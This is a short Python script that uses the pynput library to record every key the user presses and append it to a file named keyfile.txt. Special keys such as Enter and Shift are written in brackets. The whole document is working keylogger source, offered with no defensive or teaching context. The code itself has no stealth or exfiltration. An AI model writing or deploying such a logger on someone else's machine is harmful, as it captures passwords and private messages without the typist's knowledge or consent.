from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            # For normal keys (letters, numbers, symbols)
            logKey.write(key.char)
        except AttributeError:
            # For special keys (Enter, Shift, Backspace, etc.)
            logKey.write("[" + str(key) + "]")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
